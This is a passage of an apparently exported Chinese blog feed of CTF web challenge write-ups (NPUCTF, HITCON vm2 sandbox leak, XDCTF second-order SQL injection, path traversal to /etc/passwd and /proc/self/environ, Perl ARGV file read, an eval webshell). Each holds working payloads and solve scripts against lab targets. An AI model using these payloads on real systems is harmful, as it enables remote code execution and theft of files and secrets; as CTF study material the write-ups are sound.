punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>Math<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>美化一下</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">(Math&#x3D;&gt;    (Math&#x3D;Math.constructor,            Math.constructor(                Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,                    99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,                    46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,                    95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,                    121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()    ))(Math+1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是这样，<code>Math+1</code>是传入的参数</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">(x&#x3D;&gt;    (x&#x3D;x.constructor,          x.constructor(               x.fromCharCode(114,101,116,117,114,110,32,112,114,111,                    99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,                    46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,                    95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,                    121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()    ))(Math+1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="js弱类型"><a href="#js弱类型" class="headerlink" title="js弱类型"></a>js弱类型</h3><p>在这需要进行绕过</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913105338214.png"></p><p>可以利用js的弱类型</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">[1]+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;&#39;1&#39;+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;[1]!&#x3D;&#x3D;&#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里需要用json传，应该是保证一个是数组一个是字符串。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913134311240.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"http://18ba1e8e-c273-45f3-bd2b-a2b05a922885.node4.buuoj.cn:81/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"e"</span><span class="token punctuation">:</span> <span class="token string">"2-1"</span><span class="token punctuation">,</span> <span class="token string">"first"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"second"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913134604844.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HITCON 2016]Leaking</title>
      <link href="/p/325534609.html"/>
      <url>/p/325534609.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[nodejs|沙箱逃逸]</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&quot;use strict&quot;;var randomstring &#x3D; require(&quot;randomstring&quot;);var express &#x3D; require(&quot;express&quot;);var &#123;    VM&#125; &#x3D; require(&quot;vm2&quot;);var fs &#x3D; require(&quot;fs&quot;);var app &#x3D; express();var flag &#x3D; require(&quot;.&#x2F;config.js&quot;).flagapp.get(&quot;&#x2F;&quot;, function(req, res) &#123;    res.header(&quot;Content-Type&quot;, &quot;text&#x2F;plain&quot;);    &#x2F;*    Orange is so kind so he put the flag here. But if you can guess correctly :P    *&#x2F;    eval(&quot;var flag_&quot; + randomstring.generate(64) + &quot; &#x3D; \&quot;hitcon&#123;&quot; + flag + &quot;&#125;\&quot;;&quot;)    if (req.query.data &amp;&amp; req.query.data.length &lt;&#x3D; 12) &#123;        var vm &#x3D; new VM(&#123;            timeout: 1000        &#125;);        console.log(req.query.data);        res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));    &#125; else &#123;        res.send(fs.readFileSync(__filename).toString());    &#125;&#125;);app.listen(3000, function() &#123;    console.log(&quot;listening on port 3000!&quot;);&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><blockquote><p>The <code>vm</code> module enables compiling and running code within V8 Virtual Machine contexts. <strong>The <code>vm</code> module is not a security mechanism. Do not use it to run untrusted code.</strong></p></blockquote><p>是在vm虚拟机中</p><blockquote><p>在较早一点的node版本中(8.0 之前)，当Buffer的构造函数传入数字时,会得到与数字长度一致的一个Buffer，并且这个Buffer是未清零的。8.0之后的版本可以通过另一个函数Buffer.allocUnsafe(size)来获得未清空的内存。</p></blockquote><p>这题&lt;8.0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://aec15194-fd75-4137-b7ca-09b92683d609.node4.buuoj.cn:81/?data=Buffer(500)'</span>response <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag&#123;'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概意思就是不断传<code>Buffer(500)</code>进去，就有可能把沙箱内的数据带出来。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> nodejs </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[XDCTF 2015]filemanager</title>
      <link href="/p/2656617040.html"/>
      <url>/p/2656617040.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[二次注入]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910202747103.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>试了半天不行，原来<code>/www.tar.gz</code>有源码泄漏</p><p>感觉像是二次注入+错显</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910215039218.png"></p><p>试了下，原来不是。</p><p>1.构造文件名为</p><pre class="line-numbers language-none"><code class="language-none">&#39;,extension&#x3D;&#39;&#39;,filename&#x3D;&#39;x.jpg.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上传</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910233524983.png"></p><p>2.重命名</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910233609597.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910233736706.png"></p><p>使得sql语句变为</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> <span class="token punctuation">`</span><span class="token keyword">file</span><span class="token punctuation">`</span> <span class="token keyword">set</span> <span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'x.jpg'</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>oldname<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>extension<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>filename<span class="token operator">=</span><span class="token string">'x.jpg'</span> <span class="token keyword">where</span> <span class="token punctuation">`</span>fid<span class="token punctuation">`</span><span class="token operator">=</span>&#123;$result<span class="token punctuation">[</span><span class="token string">'fid'</span><span class="token punctuation">]</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样文件名为x.jpg的extension就为空了。</p><p>3.上传shell</p><p>当下情况是，有个<code>x.jpg.jpg</code>的文件，而数据库里有行<code>filename=x.jpg, extension=&#39;&#39;</code>的数据，所以需要重新上传个x.jpg</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910234924494.png"></p><p>4.重命名</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910235018934.png"></p><p>在这，取的是<code>x.jpg</code>本地文件，数据库取的是<code>filename=x.jpg, extension=&#39;&#39;</code>的数据而非刚刚新上传的数据。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210911093339396.png"></p><p>因为extension为空，就不会再拼接后缀名了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910235003658.png"></p><p>连接，结束。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_36618918/article/details/107768282">https://blog.csdn.net/qq_36618918/article/details/107768282</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[PASECA2019]honey_shop</title>
      <link href="/p/679339218.html"/>
      <url>/p/679339218.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[proc|session]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910195243330.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这种题做过很多了，当初解个码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910195847956.png" alt="image-20210910195847956"></p><p>接下来问题就是找key</p><p>尝试破解一下，没成功，还是得老老实实找key</p><p>点击图片可以下载，尝试文件包含漏洞</p><p>可行。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910201311755.png"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;self&#x2F;&#x2F; 其路径指向当前进程&#x2F;environ&#x2F;&#x2F; 记录当前进程的环境变量信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读取环境变量</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910201820721.png"></p><pre class="line-numbers language-none"><code class="language-none">O41Bwjq2maq75AD7lFKnfhZv7DoOe8PMEzl4jBHu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加密下，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:virink_2019_files_share</title>
      <link href="/p/170828619.html"/>
      <url>/p/170828619.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[魔方]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910130313751.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>index.js文件有这种混淆代码，必有蹊跷。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910191018766.png"></p><p>得，折腾半天整不出来，原来不在这里。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910192621403.png"></p><p>/uploads目录遍历是开着的</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910192720626.png"></p><p>读取下/etc/passwd</p><p>似乎有过滤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193115046.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193339328.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193357908.png"></p><p>显然，<code>../</code>和<code>/</code>被替换为空，但可以双写绕过</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193702819.png"></p><pre class="line-numbers language-none"><code class="language-none">preview?f&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;etc..&#x2F;&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没想到最后得再加个/flag,实在想不到</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;preview?f&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;f1ag_Is_h3re..&#x2F;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CSAWQual 2016]i_got_id</title>
      <link href="/p/563209711.html"/>
      <url>/p/563209711.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[perl]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CSAWQual-2016-i-got-id/image-20210910104442590.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>/cgi-bin/hello.pl</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CSAWQual-2016-i-got-id/image-20210910104458963.png"></p><p>看来是perl语言，整不会了。</p><p>猜测下上传的后端代码</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-></span>upload<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">my</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token string">"$_"</span><span class="token punctuation">;</span>        <span class="token keyword">print</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。</p></blockquote><p>这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</p><p>再加个上传项，删掉filename，改为ARGV,然后在url中加个路径：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CSAWQual-2016-i-got-id/image-20210910110842899.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[RCTF 2019]Nextphp</title>
      <link href="/p/2407208614.html"/>
      <url>/p/2407208614.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[绕过disable_function|FFI]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>上来一个马，把我整慌了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202022801.png"></p><p>连接蚁剑返回空值，看来没那么简单</p><p>看看禁用函数</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202202745.png"></p><p>限制了<strong>open_basedir</strong></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202720598.png"><br>FFI开启<br><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909211330936.png"></p><p>怪，蚁剑直接连接连不上，重新写了个马倒是可以。</p><p>里面有个preload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'print_r'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'1'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span> <span class="token 